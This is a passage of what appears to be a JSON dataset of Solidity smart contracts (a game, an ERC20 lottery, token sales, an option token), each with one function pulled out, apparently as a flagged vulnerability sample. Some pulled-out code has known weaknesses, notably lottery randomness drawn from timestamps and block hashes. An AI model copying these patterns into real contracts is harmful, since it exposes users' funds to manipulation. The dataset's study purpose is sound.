roundownables[round].GOTCH[msg.sender].add(test);\nroundvars[round].GOTCHatcontract = roundvars[round].GOTCHatcontract.sub(test);\nroundownables[round].villages[b].lastcollect = block.number;\ntest = (block.number.sub(roundownables[round].villages[c].lastcollect)).mul((roundvars[round].nextVillageId.sub(c)));\nif(roundvars[round].GOTCHatcontract < test )\n{\nroundvars[round].GOTCHatcontract = roundvars[round].GOTCHatcontract.add(test);\nroundvars[round].totalsupplyGOTCH = roundvars[round].totalsupplyGOTCH.add(test);\n}\nroundownables[round].GOTCH[msg.sender] = roundownables[round].GOTCH[msg.sender].add(test);\nroundvars[round].GOTCHatcontract = roundvars[round].GOTCHatcontract.sub(test);\nroundownables[round].villages[c].lastcollect = block.number;\ntest = (block.number.sub(roundownables[round].villages[j].lastcollect)).mul((roundvars[round].nextVillageId.sub(j)));\nif(roundvars[round].GOTCHatcontract < test )\n{\nroundvars[round].GOTCHatcontract = roundvars[round].GOTCHatcontract.add(test);\nroundvars[round].totalsupplyGOTCH = roundvars[round].totalsupplyGOTCH.add(test);\n}\nroundownables[round].GOTCH[msg.sender] = roundownables[round].GOTCH[msg.sender].add(test);\nroundvars[round].GOTCHatcontract = roundvars[round].GOTCHatcontract.sub(test);\nroundownables[round].villages[j].lastcollect = block.number;\ntest = (block.number.sub(roundownables[round].villages[d].lastcollect)).mul((roundvars[round].nextVillageId.sub(d)));\nif(roundvars[round].GOTCHatcontract < test )\n{\nroundvars[round].GOTCHatcontract = roundvars[round].GOTCHatcontract.add(test);\nroundvars[round].totalsupplyGOTCH = roundvars[round].totalsupplyGOTCH.add(test);\n}\nroundownables[round].GOTCH[msg.sender] = roundownables[round].GOTCH[msg.sender].add(test);\nroundvars[round].GOTCHatcontract = roundvars[round].GOTCHatcontract.sub(test);\nroundownables[round].villages[d].lastcollect = block.number;\ntest = (block.number.sub(roundownables[round].villages[e].lastcollect)).mul((roundvars[round].nextVillageId.sub(e)));\nif(roundvars[round].GOTCHatcontract < test )\n{\nroundvars[round].GOTCHatcontract = roundvars[round].GOTCHatcontract.add(test);\nroundvars[round].totalsupplyGOTCH = roundvars[round].totalsupplyGOTCH.add(test);\n}\nroundownables[round].GOTCH[msg.sender] = roundownables[round].GOTCH[msg.sender].add(test);\nroundvars[round].GOTCHatcontract = roundvars[round].GOTCHatcontract.sub(test);\nroundownables[round].villages[e].lastcollect = block.number;\ntest = (block.number.sub(roundownables[round].villages[f].lastcollect)).mul((roundvars[round].nextVillageId.sub(f)));\nif(roundvars[round].GOTCHatcontract < test )\n{\nroundvars[round].GOTCHatcontract = roundvars[round].GOTCHatcontract.add(test);\nroundvars[round].totalsupplyGOTCH = roundvars[round].totalsupplyGOTCH.add(test);\n}\nroundownables[round].GOTCH[msg.sender] = roundownables[round].GOTCH[msg.sender].add(test);\nroundvars[round].GOTCHatcontract = roundvars[round].GOTCHatcontract.sub(test);\nroundownables[round].villages[f].lastcollect = block.number;\ntest = (block.number.sub(roundownables[round].villages[g].lastcollect)).mul((roundvars[round].nextVillageId.sub(g)));\nif(roundvars[round].GOTCHatcontract < test )\n{\nroundvars[round].GOTCHatcontract = roundvars[round].GOTCHatcontract.add(test);\nroundvars[round].totalsupplyGOTCH = roundvars[round].totalsupplyGOTCH.add(test);\n}\nroundownables[round].GOTCH[msg.sender] = roundownables[round].GOTCH[msg.sender].add(test);\nroundvars[round].GOTCHatcontract = roundvars[round].GOTCHatcontract.sub(test);\nroundownables[round].villages[g].lastcollect = block.number;\ntest = (block.number.sub(roundownables[round].villages[h].lastcollect)).mul((roundvars[round].nextVillageId.sub(h)));\nif(roundvars[round].GOTCHatcontract < test )\n{\nroundvars[round].GOTCHatcontract = roundvars[round].GOTCHatcontract.add(test);\nroundvars[round].totalsupplyGOTCH = roundvars[round].totalsupplyGOTCH.add(test);\n}\nroundownables[round].GOTCH[msg.sender] = roundownables[round].GOTCH[msg.sender].add(test);\nroundvars[round].GOTCHatcontract = roundvars[round].GOTCHatcontract.sub(test);\nroundownables[round].villages[h].lastcollect = block.number;\ntest = (block.number.sub(roundownables[round].villages[i].lastcollect)).mul((roundvars[round].nextVillageId.sub(i)));\nif(roundvars[round].GOTCHatcontract < test )\n{\nroundvars[round].GOTCHatcontract = roundvars[round].GOTCHatcontract.add(test);\nroundvars[round].totalsupplyGOTCH = roundvars[round].totalsupplyGOTCH.add(test);\n}\nroundownables[round].GOTCH[msg.sender] = roundownables[round].GOTCH[msg.sender].add(test);\nroundvars[round].GOTCHatcontract = roundvars[round].GOTCHatcontract.sub(test);\nroundownables[round].villages[i].lastcollect = block.number;\n}",
    "function collecttaxes(uint256 village) public payable returns (uint){\nrequire(msg.value >= 1 finney);\nif(block.number > roundvars[round].lastblockpayout.add(roundvars[round].blocksbeforenewpay))\n{\nhillpayout();\n}\nrequire(roundownables[round].villages[village].owner == msg.sender);\nrequire(block.number > roundownables[round].villages[village].lastcollect);\nuint256 test = (block.number.sub(roundownables[round].villages[village].lastcollect)).mul((roundvars[round].nextVillageId.sub(village)));\nif(roundvars[round].GOTCHatcontract < test )\n{\nroundvars[round].GOTCHatcontract = roundvars[round].GOTCHatcontract.add(test);\nroundvars[round].totalsupplyGOTCH = roundvars[round].totalsupplyGOTCH.add(test);\n}\nroundownables[round].GOTCH[msg.sender] = roundownables[round].GOTCH[msg.sender].add(test);\nroundvars[round].GOTCHatcontract = roundvars[round].GOTCHatcontract.sub(test);\nroundownables[round].villages[village].lastcollect = block.number;\nreturn test;\n}",
    "function startnewround() public {\nrequire(roundvars[round].ATPO > roundownables[round].roundlength);\nround++;\nroundvars[round].totalsupplyGOTCH = nextroundtotalsupplyGOTCH;\nroundvars[round].GOTCHatcontract = nextroundtotalsupplyGOTCH;\nroundvars[round].solsforhire = nextroundsolsforhire;\nroundvars[round].soldierreplenishrate = nextroundsoldierreplenishrate;\nroundvars[round].solslastupdate = block.number;\nupdatesolbuyrate();\nroundvars[round].lastblockpayout = block.number;\nroundownables[round].hillowner = msg.sender;\nroundvars[round].nextpayamount = roundvars[round-1].nextpayamount;\nroundvars[round].nextowneramount = roundvars[round-1].nextowneramount;\nroundvars[round].previousethamount = roundvars[round-1].previousethamount;\nroundvars[round].blocksbeforenewpay = nextroundblocksbeforenewpay;\nroundownables[round].ERCtradeactive = nextroundERCtradeactive;\nroundvars[round].bpamount = 30000;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc6d750a970a4fdc0b92"
  },
  "filename": "677.sol",
  "content": "pragma solidity ^0.4.24;\ncontract IERC20Token {\n function name() public view returns (string) ;\n function symbol() public view returns (string);\n function decimals() public view returns (uint8);\n function totalSupply() public view returns (uint256);\n function balanceOf(address _owner) public view returns (uint256);\n function allowance(address _owner, address _spender) public view returns (uint256);\n function transfer(address _to, uint256 _value) public returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);\n function approve(address _spender, uint256 _value) public returns (bool success);\n}\ncontract BREBuy_ERC20 {\n struct ContractParam {\n uint32 totalSize ;\n uint256 singlePrice;\n uint8 pumpRate;\n bool hasChange;\n }\n uint256 public constant PRICE = 1;\n address owner = 0x0;\n uint32 gameIndex = 0;\n uint256 totalPrice= 0;\n ContractParam public setConfig;\n ContractParam public curConfig;\n IERC20Token public token;\n address[] public addressArray = new address[](0);\n event addPlayerEvent(uint32,address);\n event GameOverEvent(uint32,uint32,uint256,uint8,address,uint);\n constructor ( uint32 _totalSize,\n uint256 _singlePrice,\n address tokenAddr\n ) public payable {\n owner = msg.sender;\n setConfig = ContractParam(_totalSize,_singlePrice * PRICE ,5,false);\n curConfig = ContractParam(_totalSize,_singlePrice * PRICE ,5,false);\n token = IERC20Token(tokenAddr);\n startNewGame();\n }\n modifier onlyOwner {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) onlyOwner public {\n if (newOwner != address(0)) {\n owner = newOwner;\n }\n }\n function receiveApproval(address _from, uint256 _value, address _token, bytes _extraData) public {\n IERC20Token t = IERC20Token(_token);\n require(_token == address(token) );\n require(_value == curConfig.singlePrice );\n require(t.transferFrom(_from, this, _value));\n addPlayer(_from);\n }\n function changeConfig( uint32 _totalSize,uint256 _singlePrice,uint8 _pumpRate) onlyOwner public payable {\n curConfig.hasChange = true;\n if(setConfig.totalSize != _totalSize) {\n setConfig.totalSize = _totalSize;\n }\n if(setConfig.pumpRate != _pumpRate){\n setConfig.pumpRate = _pumpRate;\n }\n if(setConfig.singlePrice != _singlePrice * PRICE){\n setConfig.singlePrice = _singlePrice * PRICE;\n }\n }\n function startNewGame() private {\n gameIndex++;\n if(curConfig.hasChange) {\n if(curConfig.totalSize != setConfig.totalSize) {\n curConfig.totalSize = setConfig.totalSize;\n }\n if(curConfig.singlePrice != setConfig.singlePrice){\n curConfig.singlePrice = setConfig.singlePrice;\n }\n if( curConfig.pumpRate != setConfig.pumpRate) {\n curConfig.pumpRate = setConfig.pumpRate;\n }\n curConfig.hasChange = false;\n }\n addressArray.length=0;\n }\n function addPlayer(address player) private {\n totalPrice = totalPrice + curConfig.singlePrice;\n addressArray.push(player);\n emit addPlayerEvent(gameIndex,player);\n if(addressArray.length >= curConfig.totalSize) {\n gameResult();\n startNewGame();\n }\n }\n function getGameInfo() public view returns (uint256,uint32,uint256,uint8,address[],uint256,uint256) {\n return (gameIndex,\n curConfig.totalSize,\n curConfig.singlePrice,\n curConfig.pumpRate,\n addressArray,\n totalPrice,\n token.balanceOf(msg.sender));\n }\n function gameResult() private {\n uint index = getRamdon();\n address lastAddress = addressArray[index];\n uint256 totalBalace = token.balanceOf(this);\n uint256 giveToOwn = totalBalace * curConfig.pumpRate / 100;\n uint256 giveToActor = totalBalace - giveToOwn;\n token.transfer(owner,giveToOwn);\n token.transfer(lastAddress,giveToActor);\n emit GameOverEvent(\n gameIndex,\n curConfig.totalSize,\n curConfig.singlePrice,\n curConfig.pumpRate,\n lastAddress,\n now);\n }\n function getRamdon() private view returns (uint) {\n bytes32 ramdon = keccak256(abi.encodePacked(ramdon,now,blockhash(block.number-1)));\n for(uint i = 0; i < addressArray.length; i++) {\n ramdon = keccak256(abi.encodePacked(ramdon,now, addressArray[i]));\n }\n uint index = uint(ramdon) % addressArray.length;\n return index;\n }\n function () payable public {\n require(msg.value == 0);\n }\n}",
  "extract_feature": [
    "function getRamdon() private view returns (uint) {\nbytes32 ramdon = keccak256(abi.encodePacked(ramdon,now,blockhash(block.number-1)));\nfor(uint i = 0; i < addressArray.length; i++) {\nramdon = keccak256(abi.encodePacked(ramdon,now, addressArray[i]));\n}\nuint index = uint(ramdon) % addressArray.length;\nreturn index;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc6d750a970a4fdc0b93"
  },
  "filename": "681.sol",
  "content": "pragma solidity ^0.4.12;\ncontract IMigrationContract {\n function migrate(address addr, uint256 nas) returns (bool success);\n}\ncontract SafeMath {\n function safeAdd(uint256 x, uint256 y) internal returns(uint256) {\n uint256 z = x + y;\n assert((z >= x) && (z >= y));\n return z;\n }\n function safeSubtract(uint256 x, uint256 y) internal returns(uint256) {\n assert(x >= y);\n uint256 z = x - y;\n return z;\n }\n function safeMult(uint256 x, uint256 y) internal returns(uint256) {\n uint256 z = x * y;\n assert((x == 0)||(z/x == y));\n return z;\n }\n}\ncontract Token {\n uint256 public totalSupply;\n function balanceOf(address _owner) constant returns (uint256 balance);\n function transfer(address _to, uint256 _value) returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success);\n function approve(address _spender, uint256 _value) returns (bool success);\n function allowance(address _owner, address _spender) constant returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else {\n return false;\n }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n}\ncontract ULChain is StandardToken, SafeMath {\n string public constant name = \"Ulifechain\";\n string public constant symbol = \"ULC\";\n uint256 public constant decimals = 8;\n string public version = \"1.0\";\n address public ethFundDeposit;\n address public newContractAddr;\n bool public isFunding;\n uint256 public fundingStartBlock;\n uint256 public fundingStopBlock;\n uint256 public currentSupply;\n uint256 public tokenRaised = 0;\n uint256 public tokenMigrated = 0;\n uint256 public tokenExchangeRate = 3500;\n event AllocateToken(address indexed _to, uint256 _value);\n event IssueToken(address indexed _to, uint256 _value);\n event IncreaseSupply(uint256 _value);\n event DecreaseSupply(uint256 _value);\n event Migrate(address indexed _to, uint256 _value);\n function formatDecimals(uint256 _value) internal returns (uint256 ) {\n return _value * 10 ** decimals;\n }\n function ULChain(\n address _ethFundDeposit,\n uint256 _currentSupply)\n {\n ethFundDeposit = _ethFundDeposit;\n isFunding = false;\n fundingStartBlock = 0;\n fundingStopBlock = 0;\n currentSupply = formatDecimals(_currentSupply);\n totalSupply = formatDecimals(1000000000);\n balances[msg.sender] = totalSupply;\n if(currentSupply > totalSupply) throw;\n }\n modifier isOwner() { require(msg.sender == ethFundDeposit); _; }\n function setTokenExchangeRate(uint256 _tokenExchangeRate) isOwner external {\n if (_tokenExchangeRate == 0) throw;\n if (_tokenExchangeRate == tokenExchangeRate) throw;\n tokenExchangeRate = _tokenExchangeRate;\n }\n function increaseSupply (uint256 _value) isOwner external {\n uint256 value = formatDecimals(_value);\n if (value + currentSupply > totalSupply) throw;\n currentSupply = safeAdd(currentSupply, value);\n IncreaseSupply(value);\n }\n function decreaseSupply (uint256 _value) isOwner external {\n uint256 value = formatDecimals(_value);\n if (value + tokenRaised > currentSupply) throw;\n currentSupply = safeSubtract(currentSupply, value);\n DecreaseSupply(value);\n }\n function startFunding (uint256 _fundingStartBlock, uint256 _fundingStopBlock) isOwner external {\n if (isFunding) throw;\n if (_fundingStartBlock >= _fundingStopBlock) throw;\n if (block.number >= _fundingStartBlock) throw;\n fundingStartBlock = _fundingStartBlock;\n fundingStopBlock = _fundingStopBlock;\n isFunding = true;\n }\n function stopFunding() isOwner external {\n if (!isFunding) throw;\n isFunding = false;\n }\n function setMigrateContract(address _newContractAddr) isOwner external {\n if (_newContractAddr == newContractAddr) throw;\n newContractAddr = _newContractAddr;\n }\n function changeOwner(address _newFundDeposit) isOwner() external {\n if (_newFundDeposit == address(0x0)) throw;\n ethFundDeposit = _newFundDeposit;\n }\n function migrate() external {\n if(isFunding) throw;\n if(newContractAddr == address(0x0)) throw;\n uint256 tokens = balances[msg.sender];\n if (tokens == 0) throw;\n balances[msg.sender] = 0;\n tokenMigrated = safeAdd(tokenMigrated, tokens);\n IMigrationContract newContract = IMigrationContract(newContractAddr);\n if (!newContract.migrate(msg.sender, tokens)) throw;\n Migrate(msg.sender, tokens);\n }\n function transferETH() isOwner external {\n if (this.balance == 0) throw;\n if (!ethFundDeposit.send(this.balance)) throw;\n }\n function allocateToken (address _addr, uint256 _eth) isOwner external {\n if (_eth == 0) throw;\n if (_addr == address(0x0)) throw;\n uint256 tokens = safeMult(formatDecimals(_eth), tokenExchangeRate);\n if (tokens + tokenRaised > currentSupply) throw;\n tokenRaised = safeAdd(tokenRaised, tokens);\n balances[_addr] += tokens;\n AllocateToken(_addr, tokens);\n }\n function () payable {\n if (!isFunding) throw;\n if (msg.value == 0) throw;\n if (block.number < fundingStartBlock) throw;\n if (block.number > fundingStopBlock) throw;\n uint256 tokens = safeMult(msg.value, tokenExchangeRate);\n if (tokens + tokenRaised > currentSupply) throw;\n tokenRaised = safeAdd(tokenRaised, tokens);\n balances[msg.sender] += tokens;\n IssueToken(msg.sender, tokens);\n }\n}",
  "extract_feature": [
    "function startFunding (uint256 _fundingStartBlock, uint256 _fundingStopBlock) isOwner external {\nif (isFunding) throw;\nif (_fundingStartBlock >= _fundingStopBlock) throw;\nif (block.number >= _fundingStartBlock) throw;\nfundingStartBlock = _fundingStartBlock;\nfundingStopBlock = _fundingStopBlock;\nisFunding = true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc6d750a970a4fdc0b94"
  },
  "filename": "699.sol",
  "content": "pragma solidity ^0.4.21;\ncontract Owned {\n address public owner;\n address internal newOwner;\n function Owned() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n event updateOwner(address _oldOwner, address _newOwner);\n function changeOwner(address _newOwner) public onlyOwner returns(bool) {\n require(owner != _newOwner);\n newOwner = _newOwner;\n return true;\n }\n function acceptNewOwner() public returns(bool) {\n require(msg.sender == newOwner);\n emit updateOwner(owner, newOwner);\n owner = newOwner;\n return true;\n }\n}\ncontract SafeMath {\n function safeMul(uint a, uint b) pure internal returns (uint) {\n uint c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function safeSub(uint a, uint b) pure internal returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function safeAdd(uint a, uint b) pure internal returns (uint) {\n uint c = a + b;\n assert(c>=a && c>=b);\n return c;\n }\n}\ncontract ERC20Token {\n uint256 public totalSupply;\n mapping (address => uint256) public balances;\n function balanceOf(address _owner) constant public returns (uint256 balance);\n function transfer(address _to, uint256 _value) public returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);\n function approve(address _spender, uint256 _value) public returns (bool success);\n function allowance(address _owner, address _spender) constant public returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract PUST is ERC20Token {\n string public name = \"UST Put Option\";\n string public symbol = \"PUST\";\n uint public decimals = 0;\n uint256 public totalSupply = 0;\n uint256 public topTotalSupply = 2000;\n function transfer(address _to, uint256 _value) public returns (bool success) {\n if (balances[msg.sender] >= _value && balances[_to] + _value >= balances[_to]) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n emit Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\n if (balances[_from] >= _value && allowances[_from][msg.sender] >= _value && balances[_to] + _value >= balances[_to]) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowances[_from][msg.sender] -= _value;\n emit Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant public returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) public returns (bool success) {\n allowances[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant public returns (uint256 remaining) {\n return allowances[_owner][_spender];\n }\n mapping(address => uint256) public balances;\n mapping (address => mapping (address => uint256)) allowances;\n}\ncontract ExchangeUST is SafeMath, Owned, PUST {\n uint public ExerciseEndTime = 1546272000;\n uint public exchangeRate = 100000;\n address public ustAddress = address(0xFa55951f84Bfbe2E6F95aA74B58cc7047f9F0644);\n address public officialAddress = address(0x472fc5B96afDbD1ebC5Ae22Ea10bafe45225Bdc6);\n event Cancel(address tokenGet, uint amountGet, address tokenGive, uint amountGive, uint expires, uint nonce, address user, uint8 v, bytes32 r, bytes32 s);\n event Deposit(address token, address user, uint amount, uint balance);\n event Withdraw(address token, address user, uint amount, uint balance);\n event exchange(address contractAddr, address reciverAddr, uint _pustBalance);\n event changeFeeAt(uint _exchangeRate);\n function chgExchangeRate(uint _exchangeRate) public onlyOwner {\n require (_exchangeRate != exchangeRate);\n require (_exchangeRate != 0);\n exchangeRate = _exchangeRate;\n }\n function exerciseOption(uint _pustBalance) public returns (bool) {\n require (now < ExerciseEndTime);\n require (_pustBalance <= balances[msg.sender]);\n uint _ether = safeMul(_pustBalance, 10 ** 18);\n require (address(this).balance >= _ether);\n uint _amount = safeMul(_pustBalance, exchangeRate * 10**18);\n require (PUST(ustAddress).transferFrom(msg.sender, officialAddress, _amount) == true);\n balances[msg.sender] = safeSub(balances[msg.sender], _pustBalance);\n balances[officialAddress] = safeAdd(balances[officialAddress], _pustBalance);\n msg.sender.transfer(_ether);\n emit exchange(address(this), msg.sender, _pustBalance);\n }\n}\ncontract USTputOption is ExchangeUST {\n uint public initBlockEpoch = 40;\n uint public eachUserWeight = 10;\n uint public initEachPUST = 5 * 10**17 wei;\n uint public lastEpochBlock = block.number + initBlockEpoch;\n uint public price1=4*9995 * 10**17/10000;\n uint public price2=99993 * 10**17/100000;\n uint public eachPUSTprice = initEachPUST;\n uint public lastEpochTX = 0;\n uint public epochLast = 0;\n address public lastCallAddress;\n uint public lastCallPUST;\n event buyPUST (address caller, uint PUST);\n event Reward (address indexed _from, address indexed _to, uint256 _value);\n function () payable public {\n require (now < ExerciseEndTime);\n require (topTotalSupply > totalSupply);\n bool firstCallReward = false;\n uint epochNow = whichEpoch(block.number);\n if(epochNow != epochLast) {\n lastEpochBlock = safeAdd(lastEpochBlock, ((block.number - lastEpochBlock)/initBlockEpoch + 1)* initBlockEpoch);\n doReward();\n eachPUSTprice = calcpustprice(epochNow, epochLast);\n epochLast = epochNow;\n firstCallReward = true;\n lastEpochTX = 0;\n }\n uint _value = msg.value;\n uint _PUST = _value / eachPUSTprice;\n require(_PUST > 0);\n if (safeAdd(totalSupply, _PUST) > topTotalSupply) {\n _PUST = safeSub(topTotalSupply, totalSupply);\n }\n uint _refound = _value - safeMul(_PUST, eachPUSTprice);\n if(_refound > 0) {\n msg.sender.transfer(_refound);\n }\n officialAddress.transfer(safeMul(_PUST, eachPUSTprice));\n balances[msg.sender] = safeAdd(balances[msg.sender], _PUST);\n totalSupply = safeAdd(totalSupply, _PUST);\n emit Transfer(address(this), msg.sender, _PUST);\n if(lastCallAddress == address(0) && epochLast == 0) {\n firstCallReward = true;\n }\n if (firstCallReward) {\n uint _firstReward = 0;\n _firstReward = (_PUST - 1) * 2 / 10 + 1;\n if (safeAdd(totalSupply, _firstReward) > topTotalSupply) {\n _firstReward = safeSub(topTotalSupply, totalSupply);\n }\n balances[msg.sender] = safeAdd(balances[msg.sender], _firstReward);\n totalSupply = safeAdd(totalSupply, _firstReward);\n emit Reward(address(this), msg.sender, _firstReward);\n }\n lastEpochTX += 1;\n lastCallAddress = msg.sender;\n lastCallPUST = _PUST;\n lastEpochBlock = safeAdd(lastEpochBlock, eachUserWeight);\n }\n function whichEpoch(uint _blocknumber) internal view returns (uint _epochNow) {\n if (lastEpochBlock >= _blocknumber ) {\n _epochNow = epochLast;\n } else {\n _epochNow = epochLast + (_blocknumber - lastEpochBlock) / initBlockEpoch + 1;\n }\n }\n function calcpustprice(uint _epochNow, uint _epochLast) public returns (uint _eachPUSTprice) {\n require (_epochNow - _epochLast > 0);\n uint dif = _epochNow - _epochLast;\n uint dif100 = dif/100;\n dif = dif - dif100*100;\n for(uint i=0;i<dif100;i++)\n {\n price1 = price1-price1*5/100;\n price2 = price2-price2*7/1000;\n }\n price1 = price1 - price1*5*dif/10000;\n price2 = price2 - price2*7*dif/100000;\n _eachPUSTprice = price1+price2;\n }\n function doReward() internal returns (bool) {\n if (lastEpochTX == 1) return false;\n uint _lastReward = 0;\n if(lastCallPUST > 0) {\n _lastReward = (lastCallPUST-1) * 2 / 10 + 1;\n }\n if (safeAdd(totalSupply, _lastReward) > topTotalSupply) {\n _lastReward = safeSub(topTotalSupply,totalSupply);\n }\n balances[lastCallAddress] = safeAdd(balances[lastCallAddress], _lastReward);\n totalSupply = safeAdd(totalSupply, _lastReward);\n emit Reward(address(this), lastCallAddress, _lastReward);\n }\n function DepositETH(uint _PUST) payable public {\n require (msg.sender == officialAddress);\n topTotalSupply += _PUST;\n }\n function WithdrawETH() payable public onlyOwner {\n officialAddress.transfer(address(this).balance);\n }\n function allocLastTxRewardByHand() public onlyOwner returns (bool success) {\n lastEpochBlock = safeAdd(block.number, initBlockEpoch);\n doReward();\n success = true;\n }\n}",
  "extract_feature": [
    "function allocLastTxRewardByHand() public onlyOwner returns (bool success) {\nlastEpochBlock = safeAdd(block.number, initBlockEpoch);\ndoReward();\nsuccess = true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc6d750a970a4fdc0b95"
  },
  "filename": "702.sol",
  "content": "pragma solidity 0.4.24;\ncontract BBFarmEvents {\n event BallotCreatedWithID(uint ballotId);\n event BBFarmInit(bytes4 namespace);\n event Sponsorship(uint ballotId, uint value);\n event Vote(uint indexed ballotId, bytes32 vote, address voter, bytes extra);\n event BallotOnForeignNetwork(bytes32 networkId, uint ballotId);\n}\nlibrary BBLibV7 {\n using BytesLib for bytes;\n uint256 constant BB_VERSION = 7;\n uint16 constant USE_ETH = 1;\n uint16 constant USE_SIGNED = 2;\n uint16 constant USE_NO_ENC = 4;\n uint16 constant USE_ENC = 8;\n uint16 constant IS_BINDING = 8192;\n uint16 constant IS_OFFICIAL = 16384;\n uint16 constant USE_TESTING = 32768;\n uint32 constant MAX_UINT32 = 0xFFFFFFFF;\n struct Vote {\n bytes32 voteData;\n bytes32 castTsAndSender;\n bytes extra;\n }\n struct Sponsor {\n address sender;\n uint amount;\n }\n event CreatedBallot(bytes32 _specHash, uint64 startTs, uint64 endTs, uint16 submissionBits);\n event SuccessfulVote(address indexed voter, uint voteId);\n event SeckeyRevealed(bytes32 secretKey);\n event TestingEnabled();\n event DeprecatedContract();\n struct DB {\n mapping (uint256 => Vote) votes;\n uint256 nVotesCast;\n mapping (address => uint32) sequenceNumber;\n bytes32 ballotEncryptionSeckey;\n uint256 packed;\n bytes32 specHash;\n bytes16 extraData;\n Sponsor[] sponsors;\n IxIface index;\n bool deprecated;\n address ballotOwner;\n uint256 creationTs;\n }\n function requireBallotClosed(DB storage db) internal view {\n require(now > BPackedUtils.packedToEndTime(db.packed), \"!b-closed\");\n }\n function requireBallotOpen(DB storage db) internal view {\n uint64 _n = uint64(now);\n uint64 startTs;\n uint64 endTs;\n (, startTs, endTs) = BPackedUtils.unpackAll(db.packed);\n require(_n >= startTs && _n < endTs, \"!b-open\");\n require(db.deprecated == false, \"b-deprecated\");\n }\n function requireBallotOwner(DB storage db) internal view {\n require(msg.sender == db.ballotOwner, \"!b-owner\");\n }\n function requireTesting(DB storage db) internal view {\n require(isTesting(BPackedUtils.packedToSubmissionBits(db.packed)), \"!testing\");\n }\n function getVersion() external pure returns (uint) {\n return BB_VERSION;\n }\n function init(DB storage db, bytes32 _specHash, uint256 _packed, IxIface ix, address ballotOwner, bytes16 extraData) external {\n require(db.specHash == bytes32(0), \"b-exists\");\n db.index = ix;\n db.ballotOwner = ballotOwner;\n uint64 startTs;\n uint64 endTs;\n uint16 sb;\n (sb, startTs, endTs) = BPackedUtils.unpackAll(_packed);\n bool _testing = isTesting(sb);\n if (_testing) {\n emit TestingEnabled();\n } else {\n require(endTs > now, \"bad-end-time\");\n require(sb & 0x1ff2 == 0, \"bad-sb\");\n bool okaySubmissionBits = 1 == (isEthNoEnc(sb) ? 1 : 0) + (isEthWithEnc(sb) ? 1 : 0);\n require(okaySubmissionBits, \"!valid-sb\");\n startTs = startTs > now ? startTs : uint64(now);\n }\n require(_specHash != bytes32(0), \"null-specHash\");\n db.specHash = _specHash;\n db.packed = BPackedUtils.pack(sb, startTs, endTs);\n db.creationTs = now;\n if (extraData != bytes16(0)) {\n db.extraData = extraData;\n }\n emit CreatedBallot(db.specHash, startTs, endTs, sb);\n }\n function logSponsorship(DB storage db, uint value) internal {\n db.sponsors.push(Sponsor(msg.sender, value));\n }\n function getVote(DB storage db, uint id) internal view returns (bytes32 voteData, address sender, bytes extra, uint castTs) {\n return (db.votes[id].voteData, address(db.votes[id].castTsAndSender), db.votes[id].extra, uint(db.votes[id].castTsAndSender) >> 160);\n }\n function getSequenceNumber(DB storage db, address voter) internal view returns (uint32) {\n return db.sequenceNumber[voter];\n }\n function getTotalSponsorship(DB storage db) internal view returns (uint total) {\n for (uint i = 0; i < db.sponsors.length; i++) {\n total += db.sponsors[i].amount;\n }\n }\n function getSponsor(DB storage db, uint i) external view returns (address sender, uint amount) {\n sender = db.sponsors[i].sender;\n amount = db.sponsors[i].amount;\n }\n function setSeqNumberMax(DB storage db) internal {\n if (db.sequenceNumber[msg.sender] != MAX_UINT32) {\n db.sequenceNumber[msg.sender] = MAX_UINT32;\n }\n }\n function submitVote(DB storage db, bytes32 voteData, bytes extra) external {\n _addVote(db, voteData, msg.sender, extra);\n setSeqNumberMax(db);\n }\n function submitVoteAlways(DB storage db, bytes32 voteData, bytes extra) external {\n _addVoteAlways(db, voteData, msg.sender, extra);\n setSeqNumberMax(db);\n }\n function submitProxyVote(DB storage db, bytes32[5] proxyReq, bytes extra) external returns (address voter) {\n return _submitProxyVote(db, proxyReq, extra, false);\n }\n function submitProxyVoteAlways(DB storage db, bytes32[5] proxyReq, bytes extra) external returns (address voter) {\n return _submitProxyVote(db, proxyReq, extra, true);\n }\n function _submitProxyVote(DB storage db, bytes32[5] proxyReq, bytes extra, bool submitAlways) internal returns (address voter) {\n bytes32 r = proxyReq[0];\n bytes32 s = proxyReq[1];\n uint8 v = uint8(proxyReq[2][0]);\n bytes31 proxyReq2 = bytes31(uint248(proxyReq[2]));\n bytes32 ballotId = 